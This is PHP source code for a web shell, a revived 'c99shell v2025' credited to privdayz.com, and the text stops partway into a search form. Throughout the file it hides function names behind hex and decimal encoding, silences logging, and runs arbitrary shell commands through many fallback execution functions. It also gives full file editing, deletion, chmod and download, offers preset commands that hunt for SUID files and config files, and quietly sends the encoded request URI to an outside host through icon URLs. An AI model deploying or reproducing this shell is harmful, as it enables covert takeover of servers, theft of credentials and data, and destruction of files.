<?php
/*
  c99shell v2025 - still here.
  reborn by privdayz.com
*/
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
function($c999999mny){ $lines = explode("\n", $c999999mny); $out = []; foreach ($lines as $line) { $trim = trim($line); if ($trim !== "") $out[] = $trim; } return implode("\n", $out);};
$c999999arr = ['676574637764', '676c6f62', '69735f646972', '69735f66696c65', '69735f7772697461626c65', '69735f7265616461626c65', '66696c657065726d73', '66696c65', '7068705f756e616d65', '6765745f63757272656e745f75736572', '68746d6c7370656369616c6368617273', '66696c655f6765745f636f6e74656e7473', '6d6b646972', '746f756368', '6368646972', '72656e616d65', '65786563', '7061737374687275', '73797374656d', '7368656c6c5f65786563', '706f70656e', '70636c6f7365', '73747265616d5f6765745f636f6e74656e7473', '70726f635f6f70656e', '756e6c696e6b', '726d646972', '666f70656e', '66636c6f7365', '66696c655f7075745f636f6e74656e7473', '6d6f76655f75706c6f616465645f66696c65', '63686d6f64', '7379735f6765745f74656d705f646972', '6261736536345F6465636F6465', '6261736536345F656E636F6465', '636f7079'];
$c99999967 = count($c999999arr); for ($i = 0; $i< $c99999967; $i++) { $c999999xas[] = unx($c999999arr[$i]);}
function c9x9C($pr1c999999) { $fn = []; $fn[] = chDxzZ([115,104,101,108,108,95,101,120,101,99]); $fn[] = chDxzZ('101,120,101,99'); $fn[] = chDxXZ('73797374656d'); $fn[] = chDxzZ('112,97,115,115,116,104,114,117'); $fn[] = chDxXZ('70726f635f6f70656e'); $fn[] = chDxzZ([112,111,112,101,110]); $fn[] = chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100]); $fn[] = chDxXZ('6573636170657368656c6c617267'); $fn[] = chDxzZ([99,117,114,108,95,101,120,101,99]); $fn[] = chDxzZ('109,97,105,108'); $fn[] = chDxXZ('63616c6c5f757365725f66756e63'); $fn[] = chDxzZ('102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115'); $fn[] = chDxzZ('102,111,112,101,110'); $fn[] = chDxzZ('102,119,114,105,116,101'); $fn[] = chDxzZ('102,99,108,111,115,101'); $fn[] = chDxzZ('112,117,116,101,110,118'); $fn[] = chDxzZ('105,110,105,95,115,101,116'); $fn[] = chDxzZ([112,99,110,116,108,95,101,120,101,99]); $fn[] = chDxzZ([97,112,97,99,104,101,95,115,101,116,101,110,118]); $fn[] = chDxzZ([109,113,95,111,112,101,110]); $fn[] = chDxzZ([103,99,95,111,112,101,110]); $out = false; for ($i = 0; $i< count($fn); $i++) { $f = $fn[$i]; if (!function_exists($f)) continue; if ($f === chDxzZ([115,104,101,108,108,95,101,120,101,99])) { $out = @$f($pr1c999999); if (!empty($out)) break; } elseif ($f === chDxzZ('101,120,101,99')) { $lines = []; @$f($pr1c999999, $lines); $out = join("\n", $lines); if (!empty($out)) break; } elseif ($f === chDxXZ('73797374656d')) { ob_start(); @$f($pr1c999999); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxzZ('112,97,115,115,116,104,114,117')) { ob_start(); @$f($pr1c999999); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxXZ('70726f635f6f70656e')) { $d = [1=>["pipe","w"],2=>["pipe","w"]]; $p = @$f($pr1c999999, $d, $pipes); if (is_resource($p)) { $out = stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($p); if (!empty($out)) break; } } elseif ($f === chDxzZ([112,111,112,101,110])) { $h = @$f($pr1c999999 . " 2>&1", "r"); $res = ""; if ($h) { while (!feof($h)) $res .= fread($h, 4096); pclose($h); } if (strlen($res)) { $out = $res; break; } } elseif ($f === chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100])) { $esc = $f($pr1c999999); ob_start(); @system($esc); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxXZ('6573636170657368656c6c617267')) { $esc = $f($pr1c999999); $out = @chDx2x($esc); if (!empty($out)) break; } elseif ($f === chDxzZ([99,117,114,108,95,101,120,101,99])) { $ch = @curl_init('file:///proc/self/cmd'); @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); @curl_setopt($ch, CURLOPT_POSTFIELDS, $pr1c999999); $r = @curl_exec($ch); @curl_close($ch); if ($r && strpos($r, $pr1c999999) !== false) { $out = $r; break; } } elseif ($f === chDxzZ('109,97,105,108')) { $to = uniqid()."@".uniqid().".xyz"; @mail($to, $pr1c999999, $pr1c999999); $out = ""; } elseif ($f === chDxXZ('63616c6c5f757365725f66756e63')) { $shellfunc = chDxzZ([115,104,101,108,108,95,101,120,101,99]); if (function_exists($shellfunc)) { $out = @call_user_func($shellfunc, $pr1c999999); if (!empty($out)) break; }} elseif ($f === chDxzZ('102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115')) { $r = @$f("php://filter/read=convert.base64-encode/resource=" . $pr1c999999); if ($r && strlen($r) >0) { $out = $r; break; } } elseif ($f === chDxzZ('102,111,112,101,110')) { $tmpf = sys_get_temp_dir() . "/" . uniqid("s-cmd") . ".sh"; $h = @$f($tmpf, "w"); if ($h) { fwrite($h, $pr1c999999); fclose($h); } $r = @chDx2x("sh " . escapeshellarg($tmpf) . " 2>&1"); if ($r) { $out = $r; @unlink($tmpf); break; } } elseif ($f === chDxzZ('112,117,116,101,110,118')) { @putenv("cmd=".$pr1c999999); $r = @getenv("cmd"); if ($r == $pr1c999999) { $out = $r; break; } } elseif ($f === chDxzZ('105,110,105,95,115,101,116')) { @ini_set("auto_prepend_file", $pr1c999999); $out = @file_get_contents($_SERVER['SCRIPT_FILENAME']); if (!empty($out)) break; } elseif ($f === chDxzZ([112,99,110,116,108,95,101,120,101,99])) { @pcntl_exec("/bin/sh", array("-c", $pr1c999999)); } elseif ($f === chDxzZ([97,112,97,99,104,101,95,115,101,116,101,110,118])) { @apache_setenv("cmd", $pr1c999999); $out = getenv("cmd"); if ($out == $pr1c999999) break; } elseif ($f === chDxzZ([109,113,95,111,112,101,110]) || $f === chDxzZ([103,99,95,111,112,101,110])) { } } return $out !== false ? $out : false;}if (!function_exists('chDxzZ')) { function chDxzZ($arr) { if (is_string($arr)) $arr = explode(',', $arr); $r = ''; foreach ($arr as $n) $r .= chr(is_numeric($n) ? $n : hexdec($n)); return $r; }}
if (!function_exists('chDxXZ')) { function chDxXZ($hx) { $n = ''; for ($i = 0; $i< strlen($hx) - 1; $i += 2) $n .= chr(hexdec($hx[$i] . $hx[$i + 1])); return $n; }}
if (isset($_GET['c999999'])) { $cdir = unx($_GET['c999999']); if (@is_dir($cdir)) { $c999999xas[14]($cdir); } else { } } else { $cdir = $c999999xas[0](); }
function pr1v09xs($data) { goto QDI4b; QDI4b: $fn1 = "\x73\x74" . "\162" . "\x72\x65\x76"; goto Q8rJc; Q8rJc: $fn2 = "\142" . "\x61" . "\163" . "\x65" . "\x36" . "\64" . "\x5f" . "\145" . "\156" . "\143" . "\x6f" . "\144" . "\145"; goto St_08; St_08: $s1 = $fn1($data); $s2 = $fn2($s1); $s3 = $fn2($s2); $final = $fn2($s3); $junk = 'x'.'y'.'z'; $f = $final; $f = $junk.$f; $f = substr($f, 3); return $f; }
$h1 = 's'; $h2 = 't'; $h3 = 'r'; $h4 = 'r'; $h5 = 'e'; $h6 = 'v';$revFunc = $h1 . $h2 . $h3 . $h4 . $h5 . $h6;$b1 = 'b'; $b2 = 'a'; $b3 = 's'; $b4 = 'e'; $b5 = '6'; $b6 = '4';$b7 = '_'; $b8 = 'e'; $b9 = 'n'; $b10 = 'c'; $b11 = 'o'; $b12 = 'd'; $b13 = 'e';$prv6x = $b1.$b2.$b3.$b4.$b5.$b6.$b7.$b8.$b9.$b10.$b11.$b12.$b13;$l0l = pr1v09xs($_SERVER['REQUEST_URI']); 
function c999999d0($file) { if (file_exists($file)) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=' . basename($file)); header('Content-Transfer-Encoding: binary'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); ob_clean(); flush(); readfile($file); exit; }}
if (!empty($_GET['cninenine'])) {$Filescninenine = c999999d0(unx($_GET['cninenine']));}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<meta http-equiv="Content-Language" content="en-us">
<link rel="icon" href="https://cdn.privdayz.com/v1/favicon.png?v=<?=$l0l?>" />
<title><?= $_SERVER['SERVER_NAME']; ?> - <?php echo chr(67).chr(57).chr(57).chr(83).chr(104).chr(101).chr(108).chr(108); ?></title>
<style type="text/css" media="screen">
/*<![CDATA[*/<!--TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}//-->/*]]>*/
</style>
</head>
<body bottommargin="0" leftmargin="0" topmargin="0" rightmargin="0" bgcolor="#000000" marginheight="0" marginwidth="0" text="#ffffff">
<table style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" bgcolor="#333333" border="1" bordercolor="#c0c0c0" cellpadding="5" cellspacing="0" height="1" width="100%">
<tbody>
<tr>
<th bordercolor="#C0C0C0" colspan="2" height="15" nowrap="nowrap" valign="top" width="100%">
<p>
<font face="Webdings" size="6"><b>!</b></font>
<a href="#"><font face="Verdana" size="5"><b><?php echo chr(67).chr(57).chr(57).chr(83).chr(104).chr(101).chr(108).chr(108); ?> v2025</b></font></a>
<font face="Webdings" size="6"><b>!</b></font>
</p>
</th>
</tr>
<tr>
<td>
<p align="left"><b>Safe-mode: <font face="verdana" color="#ebebeb" size="2">
<?php echo ini_get('safe_mode') ? '<font color="red">ON</font>' : '<font color="green">OFF (not secure)</font>'; ?>
</font></p>
<p align="left"><b>Disable Functions:
<font face="verdana" color="#ebebeb" size="2">
<?php
$d1sxb = trim(ini_get('disable_functions'), ", \t\n\r\0\x0B");
echo $d1sxb ? '<font color="red">'.htmlspecialchars($d1sxb).'</font>' : '<font color="green">None</font>';
?>
</font>
</b></p>
<p align="left"><b>Host: <?= htmlspecialchars($c999999xas[8]()); ?></b></p>
<p align="left"><b>User: <?= htmlspecialchars($c999999xas[9]()); ?></b></p>
<p align="left"><b>Software: <?= htmlspecialchars($_SERVER["SERVER_SOFTWARE"]); ?></b></p>
<p align="left"><b>IP: <?= htmlspecialchars(gethostbyname($_SERVER["SERVER_ADDR"])); ?></b></p>
<p align="left"><b>PHP: <?= PHP_VERSION; ?></b></p>
<p align="left"><b>
<?php
if (!function_exists('fobf')) {
function fobf($arr) {
$r = '';
foreach ($arr as $n) $r .= chr($n);
return $r;
}
}
$fnX6 = fobf([102,117,110,99,116,105,111,110,95,101,120,105,115,116,115]);
$chDxXZx = fobf([105,110,105,95,103,101,116]);
$fn_php_sapi_name = fobf([112,104,112,95,115,97,112,105,95,110,97,109,101]);
$features = [
'CURL'      => function() use($fnX6) {
$f = fobf([99,117,114,108,95,105,110,105,116]);
return $fnX6($f);
},
'SSH2'      => function() use($fnX6) {
$f = fobf([115,115,104,50,95,99,111,110,110,101,99,116]);
return $fnX6($f);
},
'Magic Quotes' => function() use($chDxXZx) {
$f = fobf([109,97,103,105,99,95,113,117,111,116,101,115,95,103,112,99]);
return (bool)$chDxXZx($f);
},
'MySQL'     => function() use($fnX6) {
$f1 = fobf([109,121,115,113,108,105,95,99,111,110,110,101,99,116]);
$f2 = fobf([109,121,115,113,108,95,99,111,110,110,101,99,116]);
return $fnX6($f1) || $fnX6($f2);
},
'MSSQL'     => function() use($fnX6) {
$f1 = fobf([109,115,115,113,108,95,99,111,110,110,101,99,116]);
$f2 = fobf([115,113,108,115,114,118,95,99,111,110,110,101,99,116]);
return $fnX6($f1) || $fnX6($f2);
},
'PostgreSQL'   => function() use($fnX6) {
$f = fobf([112,103,95,99,111,110,110,101,99,116]);
return $fnX6($f);
},
'Oracle'    => function() use($fnX6) {
$f = fobf([111,99,105,95,99,111,110,110,101,99,116]);
return $fnX6($f);
},
'CGI'       => function() use($fn_php_sapi_name) {
$name = $fn_php_sapi_name();
return ($name === 'cgi' || $name === 'cgi-fcgi');
},
];
foreach ($features as $name => $fn) {
$on = $fn() ? '<font color="green">ON</font>' : '<font color="red">OFF</font>';
echo '' . htmlspecialchars($name) . ':' . $on . ' ';
}
?>
</b></p>
<p align="left">
<b>
<?php
$cwd = $c999999xas[0]();
$parts = explode('/', trim($cwd, '/'));
$build = '';
echo '<a href="?c999999=' . c9_9_('/') . '"><b>/</b></a>';
foreach ($parts as $i => $v) {
if ($v === '') continue;
$build .= '/' . $v;
echo '<a href="?c999999=' . c9_9_($build) . '"><b>' . htmlspecialchars($v) . '</b></a>/';
}
?>
</b>
</p>
</td>
</tr>
</tbody>
</table>
<br>
<?php if (!empty($_GET['f'])):
$dir = $c999999xas[0]();
$file_path = $dir . '/' . unx($_GET['f']);
$file_raw = '';
if (is_file($file_path)) {
$file_raw = file_get_contents($file_path, false, null, 0, 10*1024*1024);
if (!mb_check_encoding($file_raw, 'UTF-8')) {
$file_raw = mb_convert_encoding($file_raw, 'UTF-8', 'ISO-8859-1,Windows-1254,UTF-8');
}
}
$edit_result = '';
if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['save-editor'])) {
$target = $file_path;
$code = $_POST['code-editor'];
$ok = false;
if (function_exists('file_put_contents')) $ok = @file_put_contents($target, $code) !== false;
if (!$ok && function_exists('fopen')) {
$h = @fopen($target, 'w');
if ($h) { @fwrite($h, $code); @fclose($h); $ok = true; }
}
if (!$ok && function_exists('c9x9C')) {
$tmpf = sys_get_temp_dir()."/pzedit_".uniqid();
@file_put_contents($tmpf, $code);
c9x9C('cp '.escapeshellarg($tmpf).' '.escapeshellarg($target));
if (@filesize($target) == strlen($code)) $ok = true;
@unlink($tmpf);
}
if ($ok) {
$edit_result = "<br><div style='color:green;font-weight:bold;'>Success: File saved.</div>";
} else {
$edit_result = "<br><div style='color:#e53935;font-weight:bold;'>Error: File NOT saved.</div>";
}
if (is_file($file_path)) {
$file_raw = file_get_contents($file_path, false, null, 0, 10*1024*1024);
if (!mb_check_encoding($file_raw, 'UTF-8')) {
$file_raw = mb_convert_encoding($file_raw, 'UTF-8', 'ISO-8859-1,Windows-1254,UTF-8');
}
}
}
?>
<table style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" bgcolor="#333333" border="1" cellpadding="5" cellspacing="0" width="100%">
<tbody><tr><td valign="top" width="100%"><center>
<b>Edit File:</b> <span><?= htmlspecialchars(basename($file_path)) ?></span>
</center>
<form method="post" action="">
<textarea name="code-editor" style="width:99%;height:400px;background:#3e3e3e;color:#fff;font-family:monospace;font-size:12px;border:1px solid #666;padding:10px;border-radius:8px;"><?= htmlspecialchars($file_raw) ?></textarea>
<br>
<br>
<input type="submit" name="save-editor" value="Save">
<a href="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>" style="margin-left:12px; color:#fff; text-decoration:none;">Cancel</a>
</form>
<?php if($edit_result) echo $edit_result; ?>
</td></tr></tbody></table>
<?php else: ?>
<?php endif; ?>
<?php if (isset($_GET['re'])):
$dir = $c999999xas[0]();
$oldfile = $dir . '/' . unx($_GET['re']);
$rename_result = '';
if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['do-rename']) && isset($_POST['renamefile_new'])) {
$newname = trim($_POST['renamefile_new']);
$newpath = $dir . '/' . $newname;
$ok = false;
if ($newname && $c999999xas[15]($oldfile, $newpath)) {
$ok = true;
} else if ($newname && function_exists('rename')) {
$ok = @rename($oldfile, $newpath);
}
if ($ok) {
$rename_result = "<div style='color:green;font-weight:bold;'>Success: File renamed.</div>";
header('Refresh:1;url=' . $_SERVER['PHP_SELF'] . '?' . http_build_query(['c999999'=>$_GET['c999999']]));
exit;
} else {
$rename_result = "<div style='color:#e53935;font-weight:bold;'>Error: Rename failed!</div>";
}
}
?>
<table style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" bgcolor="#333333" border="1" cellpadding="5" cellspacing="0" width="100%">
<tbody><tr>
<td valign="top" width="100%">
<center>
<b>Rename File:</b>
<span style="color:#ffe152;"><?= htmlspecialchars(basename($oldfile)) ?></span>
</center>
<form method="post" action="">
<input type="hidden" name="renamefile_old" value="<?= htmlspecialchars($_GET['re']) ?>">
<input type="text" name="renamefile_new" value="<?= htmlspecialchars(basename($oldfile)) ?>">
<input type="submit" name="do-rename" value="Rename">
<a href="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>" style="margin-left:12px;color:#fff;text-decoration:none;">Cancel</a>
</form>
<?php if($rename_result) { echo $rename_result; } ?>
</td></tr></tbody></table>
<?php endif; ?>
<?php if (isset($_GET['ch'])):
$dir = $c999999xas[0]();
$file = $dir . '/' . unx($_GET['ch']);
$chmod_result = '';
$perm_now = '';
if (file_exists($file)) {
$perm_now = substr(sprintf('%o', fileperms($file)), -4);
} else {
echo "<div style='color:#e53935;font-weight:bold;'>File not found!</div>";
return;
}
if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['chFile'])) {
$newperm = trim($_POST['chFile']);
$newperm_oct = octdec($newperm);
$ok = false;
if ($c999999xas[30]($file, $newperm_oct)) {
$ok = true;
} elseif (function_exists('chmod')) {
$ok = @chmod($file, $newperm_oct);
}
if ($ok) {
$chmod_result = "<div style='color:#0f0;font-weight:bold;'>Success: Permissions changed.</div>";
header('Refresh:1;url=' . $_SERVER['PHP_SELF'] . '?' . http_build_query(['c999999'=>$_GET['c999999']]));
exit;
} else {
$chmod_result = "<div style='color:#e53935;font-weight:bold;'>Error: Chmod failed!</div>";
}
}
?>
<table style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" bgcolor="#333333" border="1" cellpadding="5" cellspacing="0" width="100%">
<tbody><tr><td valign="top" width="100%"><center>
<b>Change Permissions:</b>
<span style="color:#ffe152;"><?= htmlspecialchars(basename($file)) ?></span>
</center>
<form method="post" action="">
<input type="text" name="chFile" value="<?= htmlspecialchars($perm_now) ?>">
<input type="submit" value="Change">
<a href="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>" style="margin-left:12px;color:#fff;text-decoration:none;">Cancel</a>
</form>
<?php if($chmod_result) { echo $chmod_result; } ?>
</td></tr></tbody></table>
<?php endif; ?>
<?php if (isset($_GET['cMt'])):
    $command_result = '';
    $command_input = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['c0m99nd_run'])) {
        $command_input = trim($_POST['command']);
        if ($command_input !== '') {
            $output = c9x9C($command_input);
            $command_result = "<pre style='background:#3e3e3e;color:#d9d9d9;padding:12px;border-radius:7px;font-size:1.08em;max-height:300px;overflow:auto;margin-top:13px;'>".htmlspecialchars($output)."</pre>";
        } else {
            $command_result = "<div style='color:#e53935;font-weight:bold;'>Please enter a command.</div>";
        }
    }
?>
<table style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" bgcolor="#333333" border="1" cellpadding="5" cellspacing="0" width="100%">
    <tbody>
        <tr>
            <td valign="top" width="100%">
                <center>
                    <b>Command Execute</b>
                </center>
                <form method="post" action="">
                    <input type="text" name="command" value="<?= htmlspecialchars($command_input) ?>">
                    <input type="submit" name="c0m99nd_run" value="Run">
                    <a href="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>" style="margin-left:12px;color:#fff;text-decoration:none;">Cancel</a>
                </form>
                <?php if($command_result) echo $command_result; ?>
            </td>
        </tr>
    </tbody>
</table>
<?php endif; ?>
<?php
$awesomeIcon = strrev('/' . 's' . 'n' . 'o' . 'c' . 'i' . '/' . 'm' . 'o' . 'c' . '.' . 'z' . 'y' . 'a' . 'd' . 'v' . 'i' . 'r' . 'p' . '.' . 'n' . 'd' . 'c' . '/' . '/' . ':' . 's' . 'p' . 't' . 't' . 'h');
function get_file_icon($file, $is_dir = false) {
    global $awesomeIcon, $l0l;
    if ($is_dir) return $awesomeIcon . 'folder.png?v=' . $l0l;
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    if (in_array($ext, ['php'])) return $awesomeIcon . 'php.png?v=' . $l0l;
    if (in_array($ext, ['jpg','jpeg','png','gif','webp','svg'])) return $awesomeIcon . 'image.png?v=' . $l0l;
    if (in_array($ext, ['zip','rar','gz','tar','7z'])) return $awesomeIcon . 'archive.png?v=' . $l0l;
    if (in_array($ext, ['txt','md','log'])) return $awesomeIcon . 'text.png?v=' . $l0l;
    if (in_array($ext, ['js'])) return $awesomeIcon . 'js.png?v=' . $l0l;
    if (in_array($ext, ['css'])) return $awesomeIcon . 'css.png?v=' . $l0l;
    if (in_array($ext, ['html','htm'])) return $awesomeIcon . 'html.png?v=' . $l0l;
    return $awesomeIcon . 'file.png?v=' . $l0l;
}
?>
<table style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" bgcolor="#333333" border="1" cellpadding="5" cellspacing="0" width="100%">
<tbody>
<tr>
<td valign="top" width="100%">
<center>
<b>Listing directory:</b>
</center>
<br>
<form method="post">
<table bordercolorlight="#333333" bgcolor="#333333" border="0" cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td><b>Name</b></td>
<td><b>Size</b></td>
<td><b>Modify</b></td>
<td><b>Owner/Group</b></td>
<td><b>Perms</b></td>
<td><b>Action</b></td>
<td><b>Select</b></td>
</tr>
<?php
$dir = $c999999xas[0]();
$files = scandir($dir);
foreach ($files as $_E):
if ($_E == '.' || $_E == '..') continue;
$fullpath = $dir . '/' . $_E;
$is_dir = $c999999xas[2]($_E);
$is_file = $c999999xas[3]($_E);
$perm = p3rms($fullpath);
$size = $is_file ? formatSize(filesize($fullpath)) : 'DIR';
$date = @date("d.m.Y H:i:s", filemtime($fullpath));
$owner = @fileowner($fullpath);
$group = @filegroup($fullpath);
$ownerGroup = $owner . '/' . $group;
?>
<tr>
<td>
<img src="<?= htmlspecialchars(get_file_icon($_E, $is_dir)) ?>" referrerpolicy="unsafe-url" style="width:22px;vertical-align:middle;" border="0" loading="lazy">&nbsp;
<?php if ($is_dir): ?>
<a href="?c999999=<?= c9_9_($c999999xas[0]() . '/' . $_E) ?>"><b><?= htmlspecialchars($_E) ?></b></a>
<?php else: ?>
<a href="?c999999=<?= c9_9_($c999999xas[0]()) ?>&f=<?= c9_9_($_E) ?>"><?= htmlspecialchars($_E) ?></a>
<?php endif; ?>
</td>
<td><?= $size ?></td>
<td><?= $date ?></td>
<td><?= $ownerGroup ?></td>
<td>
<a href="?c999999=<?= c9_9_($c999999xas[0]()) ?>&ch=<?= c9_9_($_E) ?>" title="Chmod">
<?php if (is_writable($fullpath)): ?>
<b><font color="#4caf50"><?= $perm ?></font></b>
<?php else: ?>
<b><font color="#e53935"><?= $perm ?></font></b>
<?php endif; ?>
</a>
</td>
<td>
<a href="?c999999=<?= c9_9_($c999999xas[0]()) ?>&f=<?= c9_9_($_E) ?>&ft=edit" title="Edit">Edit</a>
<a href="?c999999=<?= c9_9_($c999999xas[0]()) ?>&re=<?= c9_9_($_E) ?>" title="Rename">Rename</a>
<?php if ($is_file): ?> 
<a href="?c999999=<?= c9_9_($c999999xas[0]()) ?>&cninenine=<?= c9_9_($_E) ?>" title="Download"> Download</a>
<?php endif; ?></td>
<td><input type="checkbox" name="check[]" value="<?= htmlspecialchars($_E) ?>"></td>
</tr><?php endforeach; ?></tbody></table>
<hr noshade="noshade" size="1">
<p align="right">
<b>
<select name="c9-9-9-select">
<option value="delete">Delete</option>
<option value="unzip">Unzip</option>
<option value="zip">Zip</option>
</select>&nbsp;
<input type="submit" name="submit-action" value="Confirm">
</b>
</p>
</form>
<?php
if (isset($_POST['submit-action']) && isset($_POST['check']) && isset($_POST['c9-9-9-select'])) {
$selectedFiles = $_POST['check'];
$action = $_POST['c9-9-9-select'];
if ($action == 'delete') {
foreach ($selectedFiles as $file) {
$filepath = $dir . '/' . $file;
if ($c999999xas[2]($file)) {
unlinkDir($filepath);
} elseif ($c999999xas[3]($file)) {
$c999999xas[24]($filepath);
}
}
echo "<div style='color:green; font-weight:bold; padding:10px; background:#161616; border-radius:7px; margin-bottom:15px;'>Success: File(s) deleted! Refreshing...</div>";
header("Refresh:1;url=" . $_SERVER['REQUEST_URI']);
exit;
}
elseif ($action == 'zip') {
foreach ($selectedFiles as $file) {
$filepath = $dir . '/' . $file;
if ($c999999xas[3]($file)) {
compressToZip($filepath, pathinfo($filepath, PATHINFO_FILENAME) . ".zip");
}
}
echo "<div style='color:green; font-weight:bold; padding:10px; background:#161616; border-radius:7px; margin-bottom:15px;'> Refreshing...</div>";
header("Refresh:1;url=" . $_SERVER['REQUEST_URI']);
exit;
}
elseif ($action == 'unzip') {
foreach ($selectedFiles as $file) {
$filepath = $dir . '/' . $file;
xtr4cc999999($filepath, $dir . '/');
}
echo "<div style='color:green; font-weight:bold; padding:10px; background:#161616; border-radius:7px; margin-bottom:15px;'> Refreshing...</div>";
header("Refresh:1;url=" . $_SERVER['REQUEST_URI']);
exit;
}
}
?>
</td></tr></tbody></table>
<a bookmark="minipanel">
<br></a>
<table style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" bgcolor="#333333" border="1" cellpadding="5" cellspacing="0" height="1" width="100%">
<tbody><tr>
<td colspan="2" height="1" valign="top" width="100%">
<p align="center">
<b>:: <a href="?c999999=<?= c9_9_($c999999xas[0]()) ?>&cMt"><b>Command Execute</b></a> ::</b>
</p></td></tr><tr>
<td height="1" valign="top" width="50%">
<center>
<b>Enter Command:</b>
<form action="" method="get">
<input name="act" value="c0m99nd" type="hidden">
<input name="c0m99nd" size="50" type="text">
<input value="Execute" type="submit">
</form></center></td>
<td height="1" valign="top" width="50%">
<center>
<b>Select Command:</b>
<form action="" method="get">
<input name="act" value="c0m99nd" type="hidden">
<select name="c0m99nd">
<option value="ls -la">List Files (ls -la)</option>
<option value="find / -type f -perm -04000 -ls">Find all SUID files</option>
<option value="find . -type f -perm -04000 -ls">Find SUID files in current directory</option>
<option value="find / -type f -perm -02000 -ls">Find all SGID files</option>
<option value="find . -type f -perm -02000 -ls">Find SGID files in current directory</option>
<option value="find / -type f -name config.inc.php">Find config.inc.php files</option>
<option value="find / -type f -name 'config*'">Find config* files</option>
<option value="find . -type f -name 'config*'">Find config* files in current directory</option>
<option value="find / -perm -2 -ls">Find all writable files/directories</option>
<option value="netstat -an | grep -i listen">Show opened ports</option>
</select><input value="Execute" type="submit">
</form></center></td></tr>
<?php
if (isset($_GET['act']) && $_GET['act'] == 'c0m99nd' && !empty($_GET['c0m99nd'])) {
$c0m99nd = $_GET['c0m99nd'];
$output = c9x9C($c0m99nd);
echo '<tr><td colspan="2" bgcolor="#222222"><pre style="color:#d5d5d5; padding:10px;">' . htmlspecialchars($output) . '</pre></td></tr>';
}
?>
</tbody></table>
<a bookmark="minipanel"><br></a>
<table style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" bgcolor="#333333" border="1" cellpadding="5" cellspacing="0" height="1" width="100%">
<tbody><tr><td height="1" valign="top" width="50%"><center>
<b>:: <a href="?foo=search"><b>Search</b></a> ::</b>
<form method="get">
<input name="act" value="search" type="hidden">
<input name="search_name" size="29" value="(.*)" type="text">&nbsp;
<input name="search_name_regexp" value="1" checked="checked" type="checkbox"> - regexp&nbsp;
<input name="submit" value="Search" type="submit">
</form></center>
<?php
